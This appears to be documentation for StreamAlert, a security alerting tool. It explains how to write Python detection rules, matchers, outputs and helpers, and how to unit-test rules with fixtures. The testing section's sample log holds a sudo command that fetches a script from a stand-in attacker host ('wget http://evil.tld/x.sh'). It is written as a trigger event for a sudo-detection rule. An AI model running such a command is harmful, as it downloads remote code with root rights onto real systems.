Rules
=====

* Rules encompass data analysis and alerting logic
* Rules are written in native Python, not a proprietary language
* A Rule can utilize any Python function or library
* A Rule can be run against multiple log sources if desired
* Rules can be isolated into defined environments/clusters
* Rule alerts can be sent to one or more outputs, like S3, PagerDuty or Slack
* Rules can be unit tested and integration tested

Location
--------

Rules are stored in the ``rules/`` sub-directory

A separate .py should be made for each cluster you defined in the variables.json file.

Example: ``it.py``, ``pci.py``, ``production.py``

Overview
--------

All rules take this form::

    @rule('example', logs=[...], matchers=[...], outputs=[...])
    def example(rec):
        # analyze the incoming record w/your logic
        return (
            # return true if an alert should be sent
        )

``rec`` is an incoming record from any one of the configured datasources. You define ``logs`` and ``matchers`` to ensure the logic within the ``def`` function block only runs against logs that it should.


Example
-------

Here’s an example that alerts on the use of sudo in a PCI environment::

    @rule('production_sudo',                          # name of the rule
          logs=['osquery'],                           # applicable datasource(s)
          matchers=['pci'],                           # matcher(s) to evaluate
          outputs=['s3', 'pagerduty', 'slack'])       # where to send alerts
    def production_sudo(rec):                         # rec = incoming record/log
        table_name = rec['name']
        tag = rec['columns']['tag']
        return (
          table_name == 'linux_syslog_auth' and
          fnmatch(tag, 'sudo*')
        )

You have the flexibility to perform simple or complex data analysis

Parameter Details
-----------------

logs
~~~~~~~~~~~

``logs`` defines the log sources the rule supports; the ``def`` function block is not run unless this condition is satisfied.

A rule can be run against multiple log sources if desired.

Log sources (e.g. datasources) are defined in ``conf/sources.json`` and subsequent schemas are defined in ``conf/logs.json``. For more details on how to setup a datasource, please see the Datasources section.

matchers
~~~~~~~~

``matchers`` defines the conditions that need to be satisfied in order for the ``def`` function block to run against an incoming record.

Matchers are defined in ``rules/matchers.py``

Matchers can serve 2 purposes:

* To extract common logic into helpers. This improves readability and writability
* To ensure necessary conditions are met prior to analysis of the incoming record

In the above example, we are evaluating the ``pci`` matcher. As you can likely deduce, this ensures rule logic is only run if the incoming record is coming from the pci environment. This is achieved by looking for a particular field in the log. The code::

    @matcher('pci')
    def is_prod_env(rec):
        return rec['decorations']['envIdentifier'] == 'pci'


outputs
~~~~~~~

``outputs`` defines where the alert should be sent to, if the return value of the function is true.

StreamAlert supports sending alerts to PagerDuty, Slack and AWS S3. As demonstrated in the example, an alert can be sent to multiple destinations.


Helpers
-------
To improve readability and writeability, you can put commonly used logic in functions in ``stream_alert/rule_helpers.py`` and then call the function from within your rule.

Example function::

    def in_set(data, whitelist):
        """Checks if some data exists in any elements of a whitelist.

        Args:
            data: element in list
            whitelist: list/set to search in

        Returns:
            True/False
        """
        return any(fnmatch(data, x) for x in whitelist)

Example use of that function within a rule::

    @rule('foobar', ...)
    def foobar(rec):
        ...
        user = ...
        user_whitelist = ...
        ...
        return (
          in_set(user,user_whitelist)
        )


Testing
-------

The ``test/fixtures/kinesis/`` subdirectory will contain folders for each cluster/environment.

Within each of these folders you can define:

* ``non_trigger_events.json``
* ``trigger_events.json``

This allows you to unit test your rules for expected behavior.

Recall our earlier example that alerts on the use of sudo in the pci environment. In ``trigger_events.json``, you would add an example log that should alert::

    {
    "name":"linux_syslog_auth",
    "hostIdentifier":"foobar",
    "unixTime":"1470824034",
    "decorations":{
        "envIdentifier":"pci",
        "roleIdentifier":"memcache"
        },
    "columns":{
        "tag":"sudo",
        "message":"john_adams : TTY=pts/0 ; PWD=/home/john_adams ; USER=root ; COMMAND=/usr/bin/wget http://evil.tld/x.sh",
        "facility": "authpriv"
    },
    "action":"added"
    }


.. warning:: One event per line. This log was put on multiple lines for readability and education purposes.

And lastly, in ``non_trigger_events.json``, you would add an example that shouldn't fire.




